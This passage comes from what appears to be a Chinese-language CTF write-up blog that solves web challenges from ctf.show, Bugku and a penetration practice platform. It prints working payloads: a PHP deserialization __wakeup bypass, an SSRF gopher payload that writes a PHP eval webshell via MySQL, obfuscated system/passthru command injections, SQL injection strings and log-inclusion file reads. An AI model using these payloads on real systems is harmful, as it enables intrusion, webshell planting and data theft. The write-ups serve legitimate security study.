</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们要通过反序列化读取fl4g.php里面的内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">    $A = <span class="keyword">new</span> Demo(<span class="string">'fl4g.php'</span>);</span><br><span class="line">    $b = serialize($A);</span><br><span class="line">    <span class="comment">//string(49) "O:4:"Demo":1:&#123;s:10:"Demofile";s:8:"fl4g.php";&#125;"</span></span><br><span class="line">    $b = str_replace(<span class="string">'O:4'</span>, <span class="string">'O:+4'</span>,$b);<span class="comment">//绕过preg_match</span></span><br><span class="line">    $b = str_replace(<span class="string">':1:'</span>, <span class="string">':2:'</span>,$b);<span class="comment">//绕过wakeup</span></span><br><span class="line">　　 <span class="comment">//string(49) "O:+4:"Demo":2:&#123;s:10:"Demofile";s:8:"fl4g.php";&#125;"</span></span><br><span class="line">    <span class="keyword">echo</span> (base64_encode($b));</span><br><span class="line">　　<span class="comment">//TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>+4替换成4是为了绕过preg_match的正则表达式<br>2替换成1是利用了CVE-2016-7124的漏洞，即当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行<br>最后按照题目的意思encode一下base64就获取反序列化的结果，get传参即可</p>
<p><img src="/2020/04/19/CTFstudy/9.png" alt><br>将最后的结果传参就得到flag了</p>
<h1 id="ctf-show"><a href="#ctf-show" class="headerlink" title="ctf.show"></a>ctf.show</h1><h2 id="红包9"><a href="#红包9" class="headerlink" title="红包9"></a>红包9</h2><p><a href="https://ctfshow.com/home/goods/courses/goods_id/6.html" target="_blank" rel="noopener">视屏教程地址</a></p>
<p>进去之后发现是一个登陆框，随便输入都会跳转到404界面，然后抓包，发现存在ssrf<br><img src="/2020/04/19/CTFstudy/10.png" alt><br>这里要使用ssrf攻击mysql，先下载工具<a href="https://github.com/firebroo/sec_tools/" target="_blank" rel="noopener">https://github.com/firebroo/sec_tools/</a></p>
<p>使用方法：</p>
<blockquote>
<ol>
<li><p>cd /sec_tools-master/common-gopher-tcp-stream</p>
</li>
<li><p>make编译一下</p>
</li>
<li><p>./sniffer -p3306       监听3306，题目提示为3306</p>
</li>
<li><p>然后生成shell(另一个终端)<br>1.mysql -u root -h 127.0.0.1 -p</p>
<p>2.select ‘&lt;?php eval($_POST[pass]);?&gt;’ INTO OUTFILE ‘/var/www/html/2.php’;</p>
</li>
</ol>
</blockquote>
<p>如果4.1报错的话就以安全模式启动MySQL</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">~$ sudo mysqld_safe <span class="comment">--skip-grant-tables &amp;</span></span><br></pre></td></tr></table></figure>

<p>然后将生成的payload加上gopher://127.0.0.1:3306/_，并且再一次url编码，然后我们便创建文件成功<br>payload：</p>
<blockquote>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">&gt;gopher://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">3306</span>/_<span class="symbol">%25</span>ba<span class="symbol">%2500</span><span class="symbol">%2500</span><span class="symbol">%2501</span><span class="symbol">%2584</span><span class="symbol">%25</span>a<span class="number">6</span><span class="symbol">%259</span>f<span class="symbol">%2520</span><span class="symbol">%2500</span><span class="symbol">%2500</span><span class="symbol">%2500</span><span class="symbol">%2501</span><span class="symbol">%252</span>d<span class="symbol">%2500</span><span class="symbol">%2500</span><span class="symbol">%2500</span><span class="symbol">%2500</span><span class="symbol">%2500</span><span class="symbol">%2500</span><span class="symbol">%2500</span><span class="symbol">%2500</span><span class="symbol">%2500</span><span class="symbol">%2500</span><span class="symbol">%2500</span><span class="symbol">%2500</span><span class="symbol">%2500</span><span class="symbol">%2500</span><span class="symbol">%2500</span><span class="symbol">%2500</span><span class="symbol">%2500</span><span class="symbol">%2500</span><span class="symbol">%2500</span><span class="symbol">%2507</span><span class="symbol">%2500</span><span class="symbol">%2500</span><span class="symbol">%2500</span><span class="symbol">%2572</span><span class="symbol">%256</span>f<span class="symbol">%256</span>f<span class="symbol">%2574</span><span class="symbol">%2500</span><span class="symbol">%2500</span><span class="symbol">%256</span>d<span class="symbol">%2579</span><span class="symbol">%2573</span><span class="symbol">%2571</span><span class="symbol">%256</span><span class="keyword">c</span><span class="symbol">%255</span>f<span class="symbol">%256</span>e<span class="symbol">%2561</span><span class="symbol">%2574</span><span class="symbol">%2569</span><span class="symbol">%2576</span><span class="symbol">%2565</span><span class="symbol">%255</span>f<span class="symbol">%2570</span><span class="symbol">%2561</span><span class="symbol">%2573</span><span class="symbol">%2573</span><span class="symbol">%2577</span><span class="symbol">%256</span>f<span class="symbol">%2572</span><span class="symbol">%2564</span><span class="symbol">%2500</span><span class="symbol">%257</span>d<span class="symbol">%2503</span><span class="symbol">%255</span>f<span class="symbol">%256</span>f<span class="symbol">%2573</span><span class="symbol">%2505</span><span class="symbol">%254</span><span class="keyword">c</span><span class="symbol">%2569</span><span class="symbol">%256</span>e<span class="symbol">%2575</span><span class="symbol">%2578</span><span class="symbol">%250</span><span class="keyword">c</span><span class="symbol">%255</span>f<span class="symbol">%2563</span><span class="symbol">%256</span><span class="keyword">c</span><span class="symbol">%2569</span><span class="symbol">%2565</span><span class="symbol">%256</span>e<span class="symbol">%2574</span><span class="symbol">%255</span>f<span class="symbol">%256</span>e<span class="symbol">%2561</span><span class="symbol">%256</span>d<span class="symbol">%2565</span><span class="symbol">%250</span>a<span class="symbol">%256</span><span class="keyword">c</span><span class="symbol">%2569</span><span class="symbol">%2562</span><span class="symbol">%256</span>d<span class="symbol">%2561</span><span class="symbol">%2572</span><span class="symbol">%2569</span><span class="symbol">%2561</span><span class="symbol">%2564</span><span class="symbol">%2562</span><span class="symbol">%2504</span><span class="symbol">%255</span>f<span class="symbol">%2570</span><span class="symbol">%2569</span><span class="symbol">%2564</span><span class="symbol">%2504</span><span class="symbol">%2534</span><span class="symbol">%2530</span><span class="symbol">%2537</span><span class="symbol">%2530</span><span class="symbol">%250</span>f<span class="symbol">%255</span>f<span class="symbol">%2563</span><span class="symbol">%256</span><span class="keyword">c</span><span class="symbol">%2569</span><span class="symbol">%2565</span><span class="symbol">%256</span>e<span class="symbol">%2574</span><span class="symbol">%255</span>f<span class="symbol">%2576</span><span class="symbol">%2565</span><span class="symbol">%2572</span><span class="symbol">%2573</span><span class="symbol">%2569</span><span class="symbol">%256</span>f<span class="symbol">%256</span>e<span class="symbol">%2505</span><span class="symbol">%2533</span><span class="symbol">%252</span>e<span class="symbol">%2530</span><span class="symbol">%252</span>e<span class="symbol">%2539</span><span class="symbol">%2509</span><span class="symbol">%255</span>f<span class="symbol">%2570</span><span class="symbol">%256</span><span class="keyword">c</span><span class="symbol">%2561</span><span class="symbol">%2574</span><span class="symbol">%2566</span><span class="symbol">%256</span>f<span class="symbol">%2572</span><span class="symbol">%256</span>d<span class="symbol">%2506</span><span class="symbol">%2578</span><span class="symbol">%2538</span><span class="symbol">%2536</span><span class="symbol">%255</span>f<span class="symbol">%2536</span><span class="symbol">%2534</span><span class="symbol">%250</span><span class="keyword">c</span><span class="symbol">%2570</span><span class="symbol">%2572</span><span class="symbol">%256</span>f<span class="symbol">%2567</span><span class="symbol">%2572</span><span class="symbol">%2561</span><span class="symbol">%256</span>d<span class="symbol">%255</span>f<span class="symbol">%256</span>e<span class="symbol">%2561</span><span class="symbol">%256</span>d<span class="symbol">%2565</span><span class="symbol">%2505</span><span class="symbol">%256</span>d<span class="symbol">%2579</span><span class="symbol">%2573</span><span class="symbol">%2571</span><span class="symbol">%256</span><span class="keyword">c</span><span class="symbol">%250</span><span class="keyword">c</span><span class="symbol">%255</span>f<span class="symbol">%2573</span><span class="symbol">%2565</span><span class="symbol">%2572</span><span class="symbol">%2576</span><span class="symbol">%2565</span><span class="symbol">%2572</span><span class="symbol">%255</span>f<span class="symbol">%2568</span><span class="symbol">%256</span>f<span class="symbol">%2573</span><span class="symbol">%2574</span><span class="symbol">%2509</span><span class="symbol">%2531</span><span class="symbol">%2532</span><span class="symbol">%2537</span><span class="symbol">%252</span>e<span class="symbol">%2530</span><span class="symbol">%252</span>e<span class="symbol">%2530</span><span class="symbol">%252</span>e<span class="symbol">%2531</span><span class="symbol">%2521</span><span class="symbol">%2500</span><span class="symbol">%2500</span><span class="symbol">%2500</span><span class="symbol">%2503</span><span class="symbol">%2573</span><span class="symbol">%2565</span><span class="symbol">%256</span><span class="keyword">c</span><span class="symbol">%2565</span><span class="symbol">%2563</span><span class="symbol">%2574</span><span class="symbol">%2520</span><span class="symbol">%2540</span><span class="symbol">%2540</span><span class="symbol">%2576</span><span class="symbol">%2565</span><span class="symbol">%2572</span><span class="symbol">%2573</span><span class="symbol">%2569</span><span class="symbol">%256</span>f<span class="symbol">%256</span>e<span class="symbol">%255</span>f<span class="symbol">%2563</span><span class="symbol">%256</span>f<span class="symbol">%256</span>d<span class="symbol">%256</span>d<span class="symbol">%2565</span><span class="symbol">%256</span>e<span class="symbol">%2574</span><span class="symbol">%2520</span><span class="symbol">%256</span><span class="keyword">c</span><span class="symbol">%2569</span><span class="symbol">%256</span>d<span class="symbol">%2569</span><span class="symbol">%2574</span><span class="symbol">%2520</span><span class="symbol">%2531</span><span class="symbol">%2548</span><span class="symbol">%2500</span><span class="symbol">%2500</span><span class="symbol">%2500</span><span class="symbol">%2503</span><span class="symbol">%2573</span><span class="symbol">%2565</span><span class="symbol">%256</span><span class="keyword">c</span><span class="symbol">%2565</span><span class="symbol">%2563</span><span class="symbol">%2574</span><span class="symbol">%2520</span><span class="symbol">%2527</span><span class="symbol">%253</span><span class="keyword">c</span><span class="symbol">%253</span>f<span class="symbol">%2570</span><span class="symbol">%2568</span><span class="symbol">%2570</span><span class="symbol">%2520</span><span class="symbol">%2565</span><span class="symbol">%2576</span><span class="symbol">%2561</span><span class="symbol">%256</span><span class="keyword">c</span><span class="symbol">%2528</span><span class="symbol">%2524</span><span class="symbol">%255</span>f<span class="symbol">%2550</span><span class="symbol">%254</span>f<span class="symbol">%2553</span><span class="symbol">%2554</span><span class="symbol">%255</span>b<span class="symbol">%2570</span><span class="symbol">%2561</span><span class="symbol">%2573</span><span class="symbol">%2573</span><span class="symbol">%255</span>d<span class="symbol">%2529</span><span class="symbol">%253</span>b<span class="symbol">%253</span>f<span class="symbol">%253</span>e<span class="symbol">%2527</span><span class="symbol">%2520</span><span class="symbol">%2549</span><span class="symbol">%254</span>e<span class="symbol">%2554</span><span class="symbol">%254</span>f<span class="symbol">%2520</span><span class="symbol">%254</span>f<span class="symbol">%2555</span><span class="symbol">%2554</span><span class="symbol">%2546</span><span class="symbol">%2549</span><span class="symbol">%254</span><span class="keyword">c</span><span class="symbol">%2545</span><span class="symbol">%2520</span><span class="symbol">%2527</span><span class="symbol">%252</span>f<span class="symbol">%2576</span><span class="symbol">%2561</span><span class="symbol">%2572</span><span class="symbol">%252</span>f<span class="symbol">%2577</span><span class="symbol">%2577</span><span class="symbol">%2577</span><span class="symbol">%252</span>f<span class="symbol">%2568</span><span class="symbol">%2574</span><span class="symbol">%256</span>d<span class="symbol">%256</span><span class="keyword">c</span><span class="symbol">%252</span>f<span class="symbol">%2531</span><span class="symbol">%252</span>e<span class="symbol">%2570</span><span class="symbol">%2568</span><span class="symbol">%2570</span><span class="symbol">%2527</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>然后便可以使用pass传参得到flag<br><img src="/2020/04/19/CTFstudy/11.png" alt></p>
<h2 id="红包7"><a href="#红包7" class="headerlink" title="红包7"></a>红包7</h2><p>本题主要考察git源码泄露和目录遍历读取文件内容<br>打开发现是一个phpinfo页面，扫描目录发现git源码泄露<br>使用git hack将源码下载下来，在backdoor.php发现了后门<br><img src="/2020/04/19/CTFstudy/12.png" alt>|<br>但是使用菜刀和蚁剑并连不上，所以只有通过post传参来执行命令。</p>
<p>然后再phpinfo页面发现基本上禁用了所有的命令执行函数<br><img src="/2020/04/19/CTFstudy/13.png" alt><br>但是我们还可以通过highlight_file来读取文件<br>POST</p>
<blockquote>
<p>Letmein=echo highlight_file(‘../flag.txt’);</p>
</blockquote>
<p><img src="/2020/04/19/CTFstudy/14.png" alt></p>
<h2 id="萌新web1-7"><a href="#萌新web1-7" class="headerlink" title="萌新web1-7"></a>萌新web1-7</h2><p>web1-7 只要 构造出id=1000，或者sql语句绕过或者绕过函数就能拿到flag。</p>
<p>0×01：进制转换</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.二进制 <span class="number">0b1111101000</span></span><br><span class="line"><span class="number">2</span>.十六进制 <span class="number">0x38e</span></span><br></pre></td></tr></table></figure>

<p>0×02：字节操作</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>l两次取反 ~~<span class="number">1000</span></span><br><span class="line"><span class="number">2.</span>异或 <span class="number">200</span>^<span class="number">800</span></span><br><span class="line"><span class="number">3</span>,按位与 <span class="number">992</span>|<span class="number">8</span></span><br></pre></td></tr></table></figure>

<p>0×03：运算符</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>乘法 <span class="number">200</span>*<span class="number">5</span></span><br><span class="line"><span class="number">2.</span>除法 <span class="number">10</span>/<span class="number">0.01</span></span><br><span class="line"><span class="number">3.</span>减法 <span class="number">200</span>-<span class="number">-80</span></span><br><span class="line"><span class="number">4.</span>负负 -<span class="number">-1000</span></span><br><span class="line"><span class="number">5.</span>加法 <span class="number">200</span>+<span class="number">800</span>（地址栏输入的话把+换成%<span class="number">2</span>b）</span><br></pre></td></tr></table></figure>

<p>0×04：sql注入构造</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">id</span>=1 <span class="keyword">or</span> <span class="attribute">1</span>=1#</span><br><span class="line"><span class="attribute">id</span>=id#</span><br></pre></td></tr></table></figure>

<p>0×05：绕过函数</p>
<p>intval($id)会从字符串$id的起始位置开始去数字碰到非数字就结束,当起始位置为非数字时则为0。<br>比如<br>intval(‘100a123’)=100<br>intval(‘a123’)=0</p>
<h2 id="萌新web9"><a href="#萌新web9" class="headerlink" title="萌新web9"></a>萌新web9</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $c = $_GET[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/system|exec|highlight/i"</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"cmd error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个正则是字符串中包含 system、exec、highlight才能执行eval()<br>payload:</p>
<blockquote>
<p>?c=system(%27tac%20config.php%27);</p>
</blockquote>
<h2 id="萌新web10-11"><a href="#萌新web10-11" class="headerlink" title="萌新web10-11"></a>萌新web10-11</h2><p>该题考察命令执行，源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $c = $_GET[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">"/system|exec|highlight|cat/i"</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"cmd error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接payload：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">c=$a=<span class="string">'sys'</span>;$b=<span class="string">'tem'</span>;$d=$a.$b;$d(<span class="string">'cat config.php'</span>);</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">?c=passthru(%27tac%20config.php%27);</span><br></pre></td></tr></table></figure>

<h2 id="萌新web12"><a href="#萌新web12" class="headerlink" title="萌新web12"></a>萌新web12</h2><p>这里过滤了config.php<br>payload:<br>在linux中反引号的作用就是将反引号内的Linux命令先执行，然后将执行结果赋予变量。<br>比如 cat <code>ls</code> 相当于将 ls出来的结果cat。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=passthru(<span class="string">"ca''t `ls`"</span>);</span><br><span class="line">c=$a = base64_decode(<span class="string">'c3lzdGVt'</span>);$b=base64_decode(<span class="string">'Y2F0IGNvbmZpZy5waHA='</span>);$a($b);</span><br></pre></td></tr></table></figure>

<h2 id="萌新web13"><a href="#萌新web13" class="headerlink" title="萌新web13"></a>萌新web13</h2><p>这里过滤了<code>;</code>,所以只有用<code>?&gt;</code>来闭合</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">c</span>=passthru(<span class="string">"ca''t `ls`"</span>)?&gt;</span><br><span class="line"><span class="attr">c</span>=<span class="variable">$a</span> = base64_decode(<span class="string">'c3lzdGVt'</span>)<span class="comment">;$b=base64_decode('Y2F0IGNvbmZpZy5waHA=');$a($b)?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="萌新web14-15"><a href="#萌新web14-15" class="headerlink" title="萌新web14-15"></a>萌新web14-15</h2><p>这次过滤了<code>(</code>，和<code>&gt;</code>,可以直接<code>echo $flag;</code></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">web14</span><br><span class="line">?<span class="attribute">c</span>=echo `<span class="variable">$_POST</span>[1]`?&gt;</span><br><span class="line">然后再post传入 <span class="attribute">1</span>=cat config.php</span><br><span class="line"></span><br><span class="line">web15</span><br><span class="line"></span><br><span class="line">?<span class="attribute">c</span>=echo `<span class="variable">$_POST</span>[1]`;</span><br><span class="line">然后再post传入 <span class="attribute">1</span>=cat config.php</span><br></pre></td></tr></table></figure>

<h2 id="萌新web16"><a href="#萌新web16" class="headerlink" title="萌新web16"></a>萌新web16</h2><h2 id="萌新web17-21"><a href="#萌新web17-21" class="headerlink" title="萌新web17-21"></a>萌新web17-21</h2><p>这一题考查日志包含:</p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">       $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">       <span class="keyword">if</span>(!preg_match(<span class="string">"/php/i"</span>,$c))&#123;</span><br><span class="line">               <span class="keyword">include</span>($c);</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>以前在做靶机的时候遇到过：<a href="http://cyzcc.vip/2020/03/07/vulnhub-DC5/">http://cyzcc.vip/2020/03/07/vulnhub-DC5/</a><br>方法基本一样，nginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log</p>
<p><img src="/2020/04/19/CTFstudy/17.png" alt></p>
<h1 id="New-Bugku"><a href="#New-Bugku" class="headerlink" title="New-Bugku"></a>New-Bugku</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>一打开题目就拿着代码砸我。。<br><img src="/2020/04/19/CTFstudy/1.jpg" alt><br>函数Extract：将数组中的键名设置位变量名，键值为变量中的参数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$a=<span class="keyword">array</span>(<span class="string">"a"</span>=&gt;<span class="string">"123"</span>,<span class="string">"b"</span>=&gt;<span class="string">"999"</span>);</span><br><span class="line">	 extract($a);</span><br><span class="line">	 <span class="keyword">echo</span> $a.<span class="string">"&lt;br&gt;"</span>.$b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/19/CTFstudy/2.jpg" alt><br>接下来If判断，$a的值，发现整个代码中没有出现$a，所以我们可以get提交一个a=111,这个时候就有$a了，并且$a=123 ,再继续，就可以进入到if语句中了，又遇到了一个</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$c=trim(file_get_comtents($b))</span><br></pre></td></tr></table></figure>

<p>file_get_contemts($b)就是吧$b的值给读取到里面了，然后再用trim函数处理，trim函数的用法是删除指定的字符，然后trim后面什么都没有指定，所以导致全部给删了，最后得到$c=’’。然后判断$a==$c,所以我们构造a= 即可绕过<br><img src="/2020/04/19/CTFstudy/3.jpg" alt></p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>进入题目后发现是一个计算题，但是只有三秒时间给我们计算。。。于是只有用脚本跑。<img src="/2020/04/19/CTFstudy/8.jpg" alt><br>刚好最近学爬虫是学了urllib模块和post提交的方法，于是自己尝试写了一下，但是失败了，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url=<span class="string">"http://123.206.31.85:10002/"</span></span><br><span class="line">data=urllib.request.urlopen(url).read().decode(<span class="string">"UTF-8"</span>)</span><br><span class="line">pat=<span class="string">"(\d.*)&lt;/p&gt;"</span></span><br><span class="line">result=re.compile(pat).findall(data)</span><br><span class="line">b=(<span class="string">" "</span>.join(result))</span><br><span class="line">print(b)</span><br><span class="line">a=eval(b)</span><br><span class="line">print(a)</span><br><span class="line">postdata=urllib.parse.urlencode(&#123;</span><br><span class="line">            <span class="string">"result"</span>:a</span><br><span class="line">    &#125;).encode(<span class="string">"utf-8"</span>)</span><br><span class="line">req=urllib.request.Request(url,postdata)</span><br><span class="line">result2=urllib.request .urlopen(req).read().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">print(result2)</span><br></pre></td></tr></table></figure>

<p>这个写得比较笨重，但是能算出结果，估计提交post表单的时候失败了<br><img src="/2020/04/19/CTFstudy/9.jpg" alt><br>还是使用大佬的简单脚本吧</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">'http://123.206.31.85:10002/'</span></span><br><span class="line">s = requests.session()</span><br><span class="line">html = s.get(url).text</span><br><span class="line">html = html[<span class="number">82</span>:]</span><br><span class="line">nums = re.search(<span class="string">'&lt;/p&gt;'</span>,html).start()</span><br><span class="line">html = html[:nums]</span><br><span class="line">data = &#123;<span class="string">'result'</span>:eval(html)&#125;</span><br><span class="line">result = s.post(url,data)</span><br><span class="line">print(result.text)</span><br></pre></td></tr></table></figure>

<p>几个小时过去了，也没跑出了。问了几个大佬说是题目的问题。。。。后面再说吧，说不定我的脚本没问题哈哈</p>
<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>本题打开后为一个登录框，直接先尝试万能密码，成功.<br><img src="/2020/04/19/CTFstudy/10.jpg" alt><br><img src="/2020/04/19/CTFstudy/11.jpg" alt></p>
<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>这是一个简单的SQL注入，order by 查字段，在使用联合查询<br>id=-1%20union%20select%201,2,group_concat(flag),4%20from%20flag<br><img src="/2020/04/19/CTFstudy/13.jpg" alt></p>
<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>进入页面是一个管理员系统，随便输入后显示ip禁止访问，于是想到抓包使用X-Forwarded-For: 127.0.0.1伪造一个XFF头,伪装成本地登录<br><img src="/2020/04/19/CTFstudy/5.jpg" alt><br>在审查元素时发现一段base64编码，解密后为test123，猜测可能是密码。<br><img src="/2020/04/19/CTFstudy/6.jpg" alt></p>
<p>然后使用admin等陆，成功得到flag<br><img src="/2020/04/19/CTFstudy/7.jpg" alt></p>
<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p>打开之后根据提示/robots.txt    /shell.php。进入到shell.php<br><img src="/2020/04/19/CTFstudy/12.jpg" alt><br>可知为md5截断比较~ 每次刷新页面匹配值会改变，这里采用短时间生成大量MD5，牺牲空间来换取时间~</p>
<h2 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h2><p>这个题打开后出现一段代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">$num=$_GET[<span class="string">'num'</span>];</span><br><span class="line">$str=$_GET[<span class="string">'str'</span>];</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($num)&amp;&amp;<span class="keyword">isset</span>($str)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\d+/sD'</span>,$str)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"vagetable hhhh"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $result=is_numeric($num) <span class="keyword">and</span> is_numeric($str);</span><br><span class="line">    <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$flag"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"vagetablessssss"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>分析：get传参两个参数num和str，然后判断是否存在传参，在把str匹配一个正则，使str不能为数字,所以num传入数字，str传入不含数字的字符串即可<br><img src="/2020/04/19/CTFstudy/4.jpg" alt></p>
<h1 id="安鸾渗透实战平台"><a href="#安鸾渗透实战平台" class="headerlink" title="安鸾渗透实战平台"></a><a href="http://www.whalwl.cn/" target="_blank" rel="noopener">安鸾渗透实战平台</a></h1><h2 id="简单代码审计"><a href="#简单代码审计" class="headerlink" title="简单代码审计"></a>简单代码审计</h2><p><a href="http://www.whalwl.xyz:8017" target="_blank" rel="noopener">题目地址</a></p>
<p>这是一个代码审计题目，提示有源码泄露<br>扫描目录发现.svn文件泄露<br><img src="/2020/04/19/CTFstudy/15.png" alt><br>使用<code>dvcs-ripper</code> 工具中的 <code>rip-svn.pl</code> 脚本进行 clone.得到源码<br><img src="/2020/04/19/CTFstudy/16.png" alt><br>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">session_start();</span><br><span class="line">defined(<span class="string">'black_hat'</span>) <span class="keyword">or</span> header(<span class="string">"Location: route.php?act=index"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'hat'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">'hat'</span>]==<span class="string">'green'</span>)&#123;</span><br><span class="line">	output(<span class="string">"&lt;img src='green-hat-1.jpg'&gt;"</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;a href='logout.php'&gt;妥妥的绿帽子，再给你一次机会吧!&lt;/a&gt;"</span>;</span><br><span 